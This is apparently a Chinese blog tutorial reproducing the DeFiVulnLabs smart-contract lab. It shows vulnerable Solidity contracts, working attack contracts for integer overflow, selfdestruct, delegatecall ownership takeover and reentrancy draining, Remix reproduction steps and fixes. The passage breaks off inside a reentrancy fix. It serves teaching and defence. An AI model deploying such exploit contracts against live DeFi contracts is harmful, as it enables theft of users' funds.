---
title: "区块链入门-1"
date: 2026-09-11
categories: ["区块链安全"]
tags: ["区块链安全", "web3分析"]
description: "主要从一个区块链靶场入手（湾区杯赛道一备赛）"
draft: false
---

这边以复现DeFiVulnLabs靶场为主，学习区块链安全（来自微信公众号：IceThirdSpace）

其实这个靶场可以不用部署，主要是提供漏洞代码，所有看看就行了，下不下问题不大

现在有AI了，有什么不懂的直接问就行，学习成本比原来一篇篇找CSDN低太多了

介绍：  DeFiVulnLabs一共有47个漏洞实验，包括各种经典的合约漏洞和一些少见的可能造成安全问题的不安全代码，本篇复现文章会从新手小白的角度加入一些区块链教学类的基础知识。



## 一、名词介绍

**DeFi** ：“去中心化金融”的缩写，指基于区块链技术、无需银行等中介就能运行的金融系统

**合约安全**：智能合约在设计、编码、部署与运行全过程中，防止漏洞被利用、保障资产与逻辑按预期执行的能力。由于合约一旦部署通常难以修改，且往往直接托管大量资金，安全问题的后果可能是永久性的。

**合约安全典型漏洞**：

**重入攻击**：外部合约在你尚未更新内部余额或状态时，再次调用你的函数。经典场景是取款函数先转账、后扣账，攻击者利用回调窗口反复取款。防护核心是遵循 **CEI 模式**——先检查、再更新状态、最后才与外部交互。

**权限管理缺陷**：敏感函数没有严格的访问控制，或管理员权限由单一弱密钥控制。一旦密钥泄露，攻击者可调用管理函数篡改参数或抽走资金。多签钱包和最小权限原则是基础防护。

**预言机与价格操纵**：合约依赖单一链下价格源，攻击者用闪电贷在同一笔交易中短暂拉偏价格，导致错误结算。采用多源喂价、时间加权平均价格（TWAP）可有效缓解。

**整数溢出与精度问题**：旧版 Solidity 中，算术运算超出类型范围会“回绕”。Solidity 0.8.x 已默认加入溢出检查，但在 `unchecked` 块中仍需谨慎。

**remix**：以太坊智能合约开发中最常用的在线集成开发环境（IDE），专门为写合约而生的“网页版 VS Code”

​     部署：https://app.remix.live/#lang=en&optimize&runs=200&evmVersion&version=soljson-v0.7.5+commit.eb77ed08.js

可以直接官网访问，但为了以后比赛离线做，我们可以安装一下

```bash
# 确保已经装好了 Node.js 和 npm。可以在终端里运行 node -v 和 npm -v 检查一下
npm install -g remix-ide

# 启动服务
remix-ide
```

使用教程：

1、新建sol文件，复制进去后

![1789716290740](../../web3/media/1789716290740.png)

比如这段：

```java
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.5;

contract TimeLock { //这是一个时间锁合约          
    mapping(address => uint) public balances;          
    mapping(address => uint) public lockTime;

    function deposit() external payable {  //存款接受ETH               
        balances[msg.sender] += msg.value;             
        lockTime[msg.sender] = block.timestamp + 1 weeks;//锁定时间为当前区块时间添加1周          
    }
        
    function increaseLockTime(uint _secondsToIncrease) public {              
            lockTime[msg.sender] += _secondsToIncrease; // vulnerable               
            //该合约允许用户自己增加锁仓时间              
            //接收时间参数，然后直接相加作为LockTime          
    }
        
    function withdraw() public {  //取款函数              
        require(balances[msg.sender] > 0, "Insufficient funds"); //判断地址的余额>0              
        require(//且当前区块的时间大于锁仓的时间                  
            block.timestamp > lockTime[msg.sender],                  
            "Lock time not expired"              
        );
             
        uint amount = balances[msg.sender]; //将地址的余额给amount              
        balances[msg.sender] = 0; //表示钱已取出
        (bool sent, ) = msg.sender.call{value: amount}("");               
        //使用call方法表示发送amount个以太币              
        require(sent, "Failed to send Ether");          
    }     
}
```

点击左上角的compile

2、编译代码

在compile界面（要确保pragma solidity ^0.7.5;编译器版本一样）

实用技巧：使用快捷键 ` Ctrl+S ` (Windows )或 ` Cmd+S ` (Mac )可以触发自动编译

3、部署代码

到“DEPLOY & RUN TRANSACTIONS”面板，环境选 `Remix VM`（浏览器内置的测试链，自带10个账户），账户显示有100ETH测试余额 ，点“Deploy”就能部署，终端会显示交易详情，"Deployed Contracts"区域看到合约实例。

![1789718187440](../../web3/media/1789718187440.png)

4、**调用函数**‌

 展开部署的合约实例，你会看到两个函数按钮： 

1.  在set函数输入框填写数字（如42），点击"set" 
2.  点击"get"按钮查看当前存储值 

 注意函数按钮的颜色差异： 

-  红色：payable函数（可接收ETH） 

-  橙色：普通函数 

-  蓝色：view/pure函数（只读） 

- ####  调试交易 

  1.  在终端点击失败交易的"debug"按钮 
  2.  使用调试器的单步执行功能 
  3.  观察变量值的变化情况 

   调试时特别注意： 

  -  交易消耗的gas量 
  -  状态变量的修改记录 
  -  异常抛出位置 

## 二、靶场安装

项目位置：https://github.com/SunWeb3Sec/DeFiVulnLabs

我的安装步骤：

```bash
# 先安装 Foundry
curl -L https://getfoundry.sh/install | bash

# 重启终端后，安装
foundryup

# 国内镜像加速会下的快一点，使用 githubproxy.cc 加速克隆
git clone https://githubproxy.cc/https://github.com/SunWeb3Sec/DeFiVulnLabs.git

# 子模块更新
cd ~/DeFiVulnLabs
git submodule update --init --recursive

# 可以修改子模块加速
cat .gitmodules

# 改成下面这些url（就改url）
url = https://githubproxy.cc/https://github.com/foundry-rs/forge-std
url = https://githubproxy.cc/https://github.com/openzeppelin/openzeppelin-contracts

# 保存后执行
git submodule sync
git submodule update --init --recursive

#验证靶场安装成功
mkdir -p ~/.svm/0.8.18
wget https://githubproxy.cc/https://github.com/ethereum/solidity/releases/download/v0.8.18/solc-static-linux -O ~/.svm/0.8.18/solc-0.8.18
chmod +x ~/.svm/0.8.18/solc-0.8.18
~/.svm/0.8.18/solc-0.8.18 --version
forge build
forge test --contracts ./src/test/Reentrancy.sol -vvvv
```

![1789711424029](../../web3/media/1789711424029.png)

最后看到这些长长短短的就是好了

## （一）溢出漏洞

这边看到一个很形象的比喻，说什么是合约溢出漏洞的，分享一下：

比如有这么个地方，那儿的人都不太会算数，只会从 0 数到 9，数满 9 就又绕回 0 重新开始，最后停在哪个数，就算哪个数是结果。大家一直这么过日子，也没出过什么乱子。直到有一天，来了个外地人，他摸清了这个门道，跑去金库拿金锭，一拿就拿了超过 9 个。金库管理员照老规矩帮他数，数到 9 之后又从头开始，最后一结算，发现他拿走的数量居然是 0。可实际上，金库里的金锭早就被他搬得差不多了。

黑客用的就是类似的套路：凭空往一个账户里转了一笔天文数字的代币，而合约的逻辑却只让他付出了一点点代价。

以太坊虚拟机（EVM）给整数规定了固定大小的数据类型，也就是说，一个整型变量能表示的数字范围是有限的。举个例子，`uint8` 只能存 [0, 255] 这个区间里的数。你要是硬往里塞 256，它就会变成 0。所以，只要稍不留神，既没检查用户输入，又直接拿去做计算，让数字超出了它那个类型能装下的范围，Solidity 里的变量就可能被人拿来搞事情。

### 1、漏洞解析

溢出漏洞是在接触合约安全最先接触到的漏洞，也是最简单的漏洞。溢出分为上溢和下溢，并且该漏洞在solidity8.0引入了检查，基本消失，为什么是基本消失呢？因为还有极少场景还是能溢出，后面的漏洞会提到。

### 2、代码解析

存在用户可**自定义增加锁仓时间**可让时间进行溢出，使其能够提前取出存放的ETH。 漏洞点出现在  increaseLockTime  方法中，允许用户自己增加锁仓时间。

（这边简单解释一下：这个合约本来设计了一个“时间锁”机制：你把 ETH 存进去，它给你定一个解锁时间，比如“从现在起一周后才能取”。这个设计的目的就是**锁住你的钱，让你不能马上拿走**。但问题出在 `increaseLockTime` 这个方法上。它允许用户**自己给自己加锁仓时间**。听起来好像没什么，毕竟只是“加时间”，对吧？但关键在于——它加时间的时候**没有任何上限检查**。你可以把它想象成一个**倒计时器**。正常的逻辑是：倒计时越长，你要等得越久。但因为这个倒计时器用的是一种“数到最大值就绕回 0”的计数器（也就是整数溢出），你只要一次性把时间加到超出它能表示的最大值，它就会**瞬间归零**。结果就是：你本来要等一周，现在你把这个“一周”加到了一个天文数字，计数器撑不住，直接**翻回到了一个很小的值**。于是合约一看：“哦，锁仓时间已经过了”，就乖乖把钱放给你了。）

### 3、漏洞复现

先调用deposit （存款）转入1个ETH（修改value），介绍一下这几个单位

![1789741199155](../../web3/media/1789741199155.png)

部署完之后，在下面 **Deployed Contracts** 里找到这个合约，调用它的 `deposit()` 函数。

这里要注意一下，他这个value是全局的，所以部署的时候保持value是0，而且会耗gas

![1789745237181](../../web3/media/1789745237181.png)

（1）**存款**：把 Deploy 面板上方的 **Value** 改成 `1`，单位选 `ether`，然后点 `deposit` 的 **Transact**（执行交易）。

![1789745461977](../../web3/media/1789745461977.png)

（2）**确认余额**：在 `balances` 里填你的account1地址，点 **Call**，应该看到 `1000000000000000000`。

![1789745710457](../../web3/media/1789745710457.png)

（3）**触发溢出**：在 `increaseLockTime` 里填 `115792089237316195423570985008687907853269984665640564039457584007913129639935`（即 `2**256 - 1`），点 **Transact**。(这时注意value不要带之前残留的1)

![1789745822913](../../web3/media/1789745822913.png)（4）**查看锁仓时间**：在 `lockTime` 里填你的地址，点 **Call**，观察它的值。

![1789780128652](../../web3/media/1789780128652.png)

比如这里是1790384581

(5)**提前取款**：点 `withdraw` 的 **Transact**，如果溢出成功，钱就能提前取出来。

这里我自己测试了一下，发现每次执行这个increaselocktime，时间确实是在变小的，至于 `withdraw` 成功，需要**反复调用 increaseLockTime 填 2\**256 - 1**或者**用 Remix 的 evm_increaseTime 功能**，直接增加区块时间，让当前时间超过 `lockTime`。所以这里

![1789814375703](../../web3/media/1789814375703.png)

这里increaseTime的时间可能需要算一算，让AI帮你算就行

![1789814481277](../../web3/media/1789814481277.png)

然后就可以withdraw出来了，account1还是回到了99.999eth，就是这些交易流程费了点gas

（这边有个详细的计算过程可以借鉴一下：  溢出uint256，  传入的时间戳为uint256-当前时间戳+1115792089237316195423570985008687907853269984665640564039457584007913129639935 - 1727519574 +1 = 115792089237316195423570985008687907853269984665640564039457584007911402120362）

### 4、漏洞利用

实现了一个攻击合约，引入了漏洞合约，能够直接调用目标的函数而不再需要手动点击（可以理解为写了个python利用脚本），并且额外写了个将余额提现到钱包的函数，如果没有这个函数，那么无法将我的eth转回我的钱包地址中。

脚本：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.5;

// 1. 先定义接口，包含目标（存在漏洞）合约的方法
interface ITimeLock {
    function deposit() external payable;
    function increaseLockTime(uint _secondsToIncrease) external;
    function withdraw() external;
    function lockTime(address user) external view returns (uint);
}

contract Exploit {
    ITimeLock public timeLockContract;

    // 2. 构造函数：初始化 TimeLock 合约地址
    constructor(address _timeLockAddress) {
        timeLockContract = ITimeLock(_timeLockAddress);
    }

    // 3. 存款：把 ETH 存进 TimeLock
    function deposit() external payable {
        timeLockContract.deposit{value: msg.value}();
    }

    // 4. 查询当前合约的 lockTime
    function getLockTime() external view returns (uint) {
        return timeLockContract.lockTime(address(this));
    }

    // 5. 触发溢出：构造让 lockTime 回绕到 0 的数值
    function exploitLockTime() external {
        uint lockTime = timeLockContract.lockTime(address(this));
        uint overflowValue = type(uint).max + 1 - lockTime;
        timeLockContract.increaseLockTime(overflowValue);
    }

    // 6. 取款：把钱从 TimeLock 取回 Exploit 合约
    function withdraw() external {
        timeLockContract.withdraw();
    }

    // 7. 把 Exploit 合约里的余额转给调用者
    function withdraw2wallet() external {
        uint balance = address(this).balance;
        require(balance > 0, "No balance to withdraw");
        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }

    // 8. 接收 ETH 的回调函数
    receive() external payable {}
}
```

完整攻击流程

· 部署 `TimeLock` 合约，部署 `Exploit` 合约，传入 `TimeLock` 的地址。

· 调用 `Exploit.deposit()`，附带 1 ETH，钱存进 `TimeLock`。

· 调用 `Exploit.exploitLockTime()`，触发溢出，`lockTime` 变成 0。

· 调用 `Exploit.withdraw()`，把钱从 `TimeLock` 取回到 `Exploit`。

· 调用 `Exploit.withdraw2wallet()`，把钱转到攻击者钱包。

这样就完整复现了：**整数溢出 → 绕过时间锁 → 提前取款** 的攻击链。

（1）部署timelock合约  这里要转入1eth 和exp脚本，正常部署就行，这边要自己摸索一下

![1789817405962](../../web3/media/1789817405962.png)

这边是可以选要部署哪一个合约的，两个都部署好后长这样

![1789817536333](../../web3/media/1789817536333.png)

两个都部署好后，Exploit.deposit()存入1eth，发现钱存入TimeLock，反正按照上面步骤来就行，就这么看着钱出去了

之前的靶场里面的，需要修改旧版 Solidity，而 `forge-std` 的新版本**不再兼容 0.8.13 以下**的编译器，需要把 `forge-std` 回退到最后一个兼容 **0.7.x** 的版本（v1.13.0）。在项目根目录下执行，并且手动克隆的 `openzeppelin-contracts` 是最新版本，但 Foundry 在找的路径**少了 contracts/ 这一层**，所以在根目录下创建一个`remappings.txt`，：

```bash
#降一下forge的版本
forge install foundry-rs/forge-std@v1.13.0 	

cd ~/DeFiVulnLabs
cat > remappings.txt << 'EOF'
forge-std/=lib/forge-std/src/
openzeppelin-contracts/=lib/openzeppelin-contracts/contracts/
EOF

# 修复 ABI Coder 与旧版本兼容性，修改src/test/Invariant.sol和Overflow.sol文件，在 pragma solidity 语句下方，添加一行：
pragma abicoder v2;

# 解决报错：
# DeFiVulnLabs 里混用了两套 OpenZeppelin：
    # 老案例（Overflow.sol、ERC777-reentrancy.sol）→ 需要 OpenZeppelin 3.x。
    # 新案例（大部分其他文件）→ 需要 OpenZeppelin 4.x/5.x。
cd ~/DeFiVulnLabs

# 创建备份目录
mkdir -p /tmp/backup

# 把 src/test 下除了 Overflow.sol 之外的所有文件都移走
find src/test -maxdepth 1 -name "*.sol" ! -name "Overflow.sol" -exec mv {} /tmp/backup/ \;

# 重新跑测试
forge test --match-path ./src/test/Overflow.sol -vvvv
```

![1789832471826](../../web3/media/1789832471826.png)

  1、Alice和Bob都有1个以太币余额
  2、部署TimeLock合约
  3、 Alice和Bob 都向TimeLock存入了1个以太币，他们需要等待1周才能解锁以太币
  4、 Bob 的锁溢了
  6、Alice无法提取1个以太币，因为锁定时间未到期。
   7、Bob可以提取1个以太币，因为lockTime溢出到0

```bash
  ## 修复方式：使用的 版本大于8.0 或者使用 safeMath 第三方库就可以避免溢出问题了。
```



## （二）自销毁函数的恶意利用

### 1、漏洞解析

Selfdestruct这个函数主要用于销毁智能合约并将其剩余的以太币发送到指定的地址。该攻击利用 Selfdestruct函数销毁自己，把ETH转入对方合约达到效果 ，对于本案例中是损人不利己的行为，因为自己的销毁将导致对方合约内的ETH将永远被锁住。

### 2、代码解析

设置了一个无聊的gamefi游戏，允许用户用户每次传入1ether,直到有用户传入ether时的值刚好达到7个ether就可以进行体现，也就是说这个游戏有1/7的概率获取6枚ETH。在正常情况下，合约里的ether值永远小于等于7，因此如果ether大于等于7的时候，该游戏合约就将无法使用。

在一般情况下， Selfdestruct  的正确用法：
  1、合约出现严重的安全安全问题，需要快速转移合约上的余额
  2、开发者使用selfdestruct来销毁不再使用的合约
  3、如下所示，校验30天后才能调用，校验发起者是否为owner，将余额转给owner。

```java
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title SelfDestruct
/// @notice 一个带有 30 天延迟的 selfdestruct 示例合约
/// @dev 部署时需要附带 ETH，只有 owner 在超时后可以销毁合约
contract SelfDestruct {
    // 状态变量

    /// @notice 合约所有者地址
    address public owner;

    /// @notice 合约创建时间戳
    uint public creationTime;

    /// @notice 允许销毁合约的超时时间（30 天）
    uint public constant SELF_DESTRUCT_TIMEOUT = 30 days;

    // 构造函数

    /// @notice 部署合约时设置 owner 并记录创建时间
    /// @dev 部署时需要附带 ETH，用于后续测试余额
    constructor() payable {
        owner = msg.sender;
        creationTime = block.timestamp;
    }

    // 外部函数

    /// @notice 销毁合约并把余额转给 owner
    /// @dev 只有 owner 在创建时间满 30 天后才能调用
    function destroyContract() public {
        require(
            msg.sender == owner,
            "Only the owner can destroy this contract"
        );
        require(
            block.timestamp > creationTime + SELF_DESTRUCT_TIMEOUT,
            "Contract cannot be destroyed yet"
        );

        selfdestruct(payable(owner));
    }

    /// @notice 查询当前合约余额
    /// @return 当前合约持有的 ETH 数量（wei）
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    // 接收 ETH

    /// @notice 允许合约直接接收 ETH
    receive() external payable {}
}
```

### 3、漏洞复现

```java
//目标漏洞合约，EtherGame合约

pragma solidity ^0.8.0;

contract EtherGame {
    uint public constant targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {  //传入1ether
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance; // vulnerable    //获取当前合约地址的余额
        require(balance <= targetAmount, "Game is over");  //如果当前地址大于7 ether游戏结束

        if (balance == targetAmount) {
            winner = msg.sender;    //如果合约地址余额==7 ether，设置胜利者为msg.sender
        }
    }

    //这个无聊的游戏允许用户每次传入1ether,直到有用户第一个传入7个ether
    function claimReward() public {   //将合约中的所有eth转给msg.sender
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}
```

```java
// 合约漏洞利用代码，Attack合约

pragma solidity ^0.8.0;

interface EtherGame {
    function deposit() external payable;
}

contract Attack {
    EtherGame public etherGame;

    constructor(address _etherGameAddress) {
        etherGame = EtherGame(_etherGameAddress);
    }

    function attack() public payable {
        // 强制将以太币转入目标合约
        selfdestruct(payable(address(etherGame)));
    }
}
```

 攻击步骤：

  （1）部署EtherGame合约、Attack合约

  （2）Alice向 EtherGame合约转入6枚ETH

  （3）点击Attack.attack，并转入1ETH，此时的 EtherGame合约内有7个ETH，但是winnner却是0地址

![1789833758249](../../web3/media/1789833758249.png)

  之后该游戏合约因DOS导致无法正常使用了，该种攻击操作是损人不利己的行为，因为该行为会将自己合约上的余额转入对方合约，并且永远无法提现。

```bash
## 修复方式：
全局定义 balance且设置 balance只受到msg.value的影响， 而不是在合约方法里定义然后再赋值，这样对方销毁后转入合约里，也是无用功，反而钱会被人都拿走。
```

修改后的合约代码：

```java
pragma solidity ^0.8.0;

contract EtherGame {
    uint public constant targetAmount = 7 ether;
    uint public balance;
    address public winner;

    function deposit() public payable {  //传入1ether
        require(msg.value == 1 ether, "You can only send 1 Ether");

        balance += msg.value;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;    //如果合约地址余额==7 ether，设置胜利者为msg.sender
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");

        // 重置游戏状态
        balance = 0;
        winner = address(0);
    }
}
```

## （三）不安全的Delegatecall

### 1、 漏洞解析

 Delegatecall和Call都被称为低级调用，他们的区别是状态存储时（变量改变时）影响的合约不同。
 目标合约地址.call   使用  被调用者的上下文  （影响目标合约）
 目标合约地址.Delegatecall  使用  调用者的上下文（影响自身合约）
 由于影响的是自身合约，因此如果出现不安全的Delegatecall调用，容易造成安全问题

### 2、代码解析

代码有两个合约，第一个合约比较简单，不赘述。第二个合约设置了一个代理合约，允许接受在合约部署时接受一个地址，并且硬编码owner地址。并且当有人调用该合约里一个不存在的方法时，就会触发fallback函数执行msg.data，此时会影响自己的owner的值 ，我们的目的就是改变这个owner的值。

```java
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ============================================================
// 第一段代码：逻辑合约（Logic / Implementation）
// 没有什么问题，是一个非常简单的 Demo
// ============================================================
contract Delegate {
    // 存储在 slot 0（状态变量按顺序存放在 slot 0/1/2/3/4 ...）
    address public owner;

    // 将 owner 设置为 msg.sender
    function pwn() public {
        owner = msg.sender;
    }
}

// ============================================================
// 第二段代码：代理合约（Proxy）
// 代理合约一般用于合约升级，通常借助 delegatecall 实现
// ============================================================
contract Proxy {
    // owner 被硬编码，存储在 slot 0（状态变量按顺序存放在 slot 0/1/2/3/4 ...）
    address public owner = address(0xdeadbeef);

    Delegate delegate;

    // 构造函数，接受一个地址
    constructor(address _delegateAddress) public {
        delegate = Delegate(_delegateAddress);
    }

    // 当调用代理合约的函数不存在时，会触发 fallback 函数
    fallback() external {
        // 使用 delegatecall 执行 msg.data，此时影响的是 Proxy 合约（自己）
        (bool suc, ) = address(delegate).delegatecall(msg.data); // vulnerable
        require(suc, "Delegatecall failed");
    }
}
```

  有两种方式可以触发fallback， 在本案例里，我们使用的是第二种方式来触发facllback，这种方式可以有两种触发方式

这边说明一下solidity 0.6.0之后contract的两个兜底函数

| 函数         | 触发时机                                        | 是否可 `payable`   |
| ------------ | ----------------------------------------------- | ------------------ |
| `receive()`  | 收到纯 ETH 转账（`msg.data` 为空）              | **必须** `payable` |
| `fallback()` | 调用不存在的函数，或收到 ETH 但 `msg.data` 非空 | 可选 `payable`     |

- 方式1：向某合约直接转账时（会触发某合约中的 fallack 函数）

  在remix编辑器里 Low level interactions  输入错误的CALLDATA，触发了Delegatecall failed

  其实这里想纠正一下：

  这里其实**不是"转账"**，而是：

  - 在 Remix 的 **Low level interactions** 里，你可以：
    1. 填 `Value`（转账金额）+ 空的 `CALLDATA` → 这才是"纯转账"
    2. 填 `CALLDATA`（任意字节）→ 这其实是一次**低级调用**，calldata 匹配不到函数 → 触发 `fallback`

  你在 Remix 里填了"错误的 CALLDATA"，触发的其实是**方式2（函数匹配不到）**，而不是方式1（转账）。

  **因为本案例的 fallback 不是 payable，单纯转账会直接 revert，根本不会触发 fallback。**

- 方法2：向某合约调用无法匹配到函数名的函数时（会触发某合约中的 fallack 函数）

  编写另外一个合约，在合约代码里调用，此时也会触发fallback（虽然无法直接看出来）

### 3、漏洞利用

完整攻击链说明：

Attacker.attack()
   └─> Proxy.call("pwn()")        // Proxy 匹配不到 pwn() → 触发 fallback
​          └─> Delegate.pwn()      // delegatecall 执行 Delegate 代码
​                 └─> Proxy.owner = msg.sender   // 改写的是 Proxy 的 slot 0

（1）部署两个合约，Proxy合约指向Delegate合约

就是上面贴出来的那段代码

![1789886301554](../../web3/media/1789886301554.png)

不过我觉得分开部署清楚一点，这里贴一下代码：

```java
// Delegate.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 第一段代码：逻辑合约（Logic / Implementation）
// 没有任何问题，是一个非常简单的 Demo
contract Delegate {
    // 存储在 slot 0（状态变量按顺序存放在 slot 0/1/2/3/4 ...）
    address public owner;

    // 将 owner 设置为 msg.sender
    function pwn() public {
        owner = msg.sender;
    }
}
```

```java
// proxy.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Delegate.sol";   // ← 加上这一行

// 第二段代码：代理合约（Proxy）
// 代理合约一般用于合约升级，通常借助 delegatecall 实现
contract Proxy {
    // owner 被硬编码，存储在 slot 0（状态变量按顺序存放在 slot 0/1/2/3/4 ...）
    address public owner = address(0xdeadbeef);

    Delegate delegate;

    // 构造函数，接受一个地址（这里要传入 Delegate 合约的地址）
    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
    }

    // 当调用代理合约的函数不存在时，会触发 fallback 函数
    fallback() external {
        // 使用 delegatecall 执行 msg.data，此时影响的是 Proxy 合约（自己）
        (bool suc, ) = address(delegate).delegatecall(msg.data); // vulnerable
        require(suc, "Delegatecall failed");
    }
}
```

（2）proxy合约里的owner 的值被硬编码，且按道理无法修改

但是该合约使用了不安全的 delecatecall，因此我们能够通过这个函数来影响上下文， 如下代码所示：
  proxyAddress地址指向了Proxy合约地址，往里面传入了pwn()方法，但是Proxy合约里并没有pwn方法，因此触发了fallback函数，并且传入了 msg.data（call里的内容就是msg.data，需要进行abi编码） ，然后Proxy使用deletagecall调用Delegate.pwn，对proxy.address进行了修改。

```java
// attacker.sol
// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;
contract Attacker {
    address  public  proxyAddress;
    constructor ( address _proxyAddress ) {
        proxyAddress = _proxyAddress;
    }
    // 调用不存在的函数来触发 Proxy 合约的 fallback
    function  attack (  )  external {
        // 调用一个不存在的函数
        (bool success, ) = proxyAddress.call(abi.encodeWithSignature( "xxxxxx()" ));
        require (success,  "Attack failed" );
    }
}
```

三个合约都部署好后，（注意三个合约的部署地址要环环相扣）

验证攻击前状态：找到proxy实例的owner    0x00000000000000000000000000000000DeaDBeef

发起攻击方式一：

┌─────────────────────────────────────────────────────┐
│ 1. 部署 Delegate           → 地址 0xd91……F39138                                                       │
│ 2. 部署 Proxy(0xAAAA)      → 地址 0xd8b……2833fa8                                                │
│ 3. 部署 Attacker(0xBBBB)   → 地址 0xCCCC                                                               │
│                                                                                                                                       │
│ 4. 查看 Proxy.owner = 00DeaDBeef                                                                             │
│                                                                                                                                       │
│ 5. 调用 Attacker.attack()                                                                                                │
│       └─> Proxy.call("pwn()")                                                                                           │
│             └─> Proxy 无 pwn() → 触发 fallback                                                                │
│                   └─> delegatecall → Delegate.pwn()                                                           │
│                         └─> 改写 Proxy 的 slot 0                                                                      │
│                                                                                                                                       │
│ 6. 再看 Proxy.owner = Attacker 地址（攻击成功）                                                       │
└─────────────────────────────────────────────────────┘

![1789918983783](../../web3/media/1789918983783.png)

发现地址确实是变了

## （四）重入漏洞

### 1、漏洞解析

让合约在"还没处理完上一次调用"的时候，又被外部重新调用一次，从而重复执行本应只执行一次的逻辑。

类比 Web 里的**并发 / 竞态条件**：同一个操作还没写完状态，又被另一次请求插进来执行。

两个关键点：

存在外部调用函数，合约内部向外部地址发起调用	

状态更新的顺序，**先转账，还是先扣余额？**（这个挺关键的，先扣款就没有漏洞了）

### 2、代码解析

典型的存款提现合约（银行合约）

```java
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title 银行合约
/// @notice 一个存在重入漏洞的示例合约（仅用于教学/演示）
contract Bank {
    /// @notice 记录每个地址存入的 ETH 数量
    mapping(address => uint256) public balances;

    /// @notice 存入 ETH
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    /// @notice 提取指定数量的 ETH
    /// @param _weiToWithdraw 要提取的 wei 数量
    function withdrawFunds(uint256 _weiToWithdraw) public {
        // 判断余额是否足够
        require(balances[msg.sender] >= _weiToWithdraw, "Insufficient balance");

        // 必须先进行 deposit 才能 withdrawFunds
        // 注意：此处先转账后更新状态，存在重入风险
        (bool success, ) = msg.sender.call{value: _weiToWithdraw}("");
        require(success, "Send failed");

        if (balances[msg.sender] >= _weiToWithdraw) {
            balances[msg.sender] -= _weiToWithdraw; // 更新用户余额
        }
    }
}
```

先进行了call外部调用转账，然后再更新用户余额，此时就会产生重入漏洞。在更新余额之前，用户可以创造一个合约反复调用，由于余额未更新，所以攻击者可以反复提取。原本只有10个代币，利用重入漏洞可以额外获得100个代币（就是一直向外提取代币）只要 `Bank` 还有钱，`receive()` 就一直递归

当 `msg.sender.call{value: ...}("")` 执行时，会触发接收方的 `receive()` 或 `fallback()` 函数。如果接收方是一个恶意合约，它可以在 `receive()` 里**再次调用** `withdrawFunds`，而此时 `balances[msg.sender]` 还没被扣减，所以余额检查依然通过，在更新状态前，重新进入函数。

攻击代码：

```java
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title 银行合约接口
interface IEtherStore {
    function deposit() external payable;

    function withdrawFunds(uint256 _weiToWithdraw) external;
}

/// @title 攻击合约
/// @notice 利用 Bank 合约的重入漏洞进行攻击（仅用于教学/演示）
contract Attack {
    IEtherStore public etherStore;
    address payable public owner;

    /// @param _etherStoreAddress 目标银行合约地址
    constructor(address _etherStoreAddress) {
        etherStore = IEtherStore(_etherStoreAddress);
        owner = payable(msg.sender); // 设置合约部署者为所有者
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    /// @notice 向目标合约存入 1 ether
    function deposit() external payable {
        etherStore.deposit{value: 1 ether}();
    }

    /// @notice 发起攻击，提取 1 ether
    function attack() external payable {
        etherStore.withdrawFunds(1 ether);
    }

    /// @notice 接收 ETH 时触发重入
    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }

    /// @notice 将合约中的 ETH 转给所有者
    function withdraw() external onlyOwner {
        owner.transfer(address(this).balance);
    }
}
```

### 3、漏洞复现

（1）部署两个合约，并且把bank的地址传入attack

（2）存入诱饵：攻击者调用 `Attack.deposit()`，并附带 1 ETH，这时`Bank.balances[Attack合约地址] = 1 eth`

​         同时换一个用户account2，模拟"其他用户的存款"，这样 `Attack` 重入时才能真正把 `Bank` 掏空，看到攻击效果。

（3）发起攻击：调用 `Attack.attack()`

（4）首次转账触发回调：向 `Attack` 合约转入 1 ETH，并触发 `Attack` 的 `receive()` 函数，

​        **此时 Bank.balances[Attack] 还是 1 ether**，

​       重入调用 `withdrawFunds(1 eth)` 时，`require(balances[Attack] >= 1 eth)` 依然成立

（5）递归回退：第二次进入 `Bank.withdrawFunds` 后，又执行转账 → 又触发 `Attack.receive()` → 又检查 `Bank` 余额 → 又调用 `withdrawFunds`……如此反复，直到 `Bank` 合约的余额不足以再转出 1 ETH 为止（`receive()` 里的 `if` 条件不满足，停止递归）。假设 `Bank` 合约原本有 N 个 ETH（例如其他用户存入的），攻击循环大致如下：

```text
第 1 次调用：Bank 转 1 ETH 给 Attack，触发 receive
第 2 次调用：Bank 转 1 ETH 给 Attack，触发 receive
第 3 次调用：Bank 转 1 ETH 给 Attack，触发 receive
...
直到 Bank.balance < 1 ether，停止
```

**攻击者用 1 ETH 的记账余额，提走了 Bank 里所有的钱**

（6）转移赃款：调用 `Attack.withdraw()`，转入自己的钱包

![1789958009192](../../web3/media/1789958009192.png)

这样可以看到，account1拿到account2存入银行的5eth了，太有意思了

这就是著名的 **The DAO 事件（2016）** 所利用的漏洞类型，直接导致了以太坊硬分叉（ETH / ETC 分裂）

### 4、修复漏洞

方式一：使用互斥锁（重入锁）修饰符

```java
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title 银行合约（重入防护版）
/// @notice 使用状态变量 `status` 实现简单的重入锁（Reentrancy Guard）
contract Bank {
    /// @notice 记录每个地址存入的 ETH 数量
    mapping(address => uint256) public balances;

    /// @dev 重入锁状态：0 表示未进入，1 表示已进入
    uint256 private status;

    /// @notice 防止函数被重入调用
    modifier nonReentrant() {
        require(status == 0, "Reentrant call");
        status = 1;
        _;
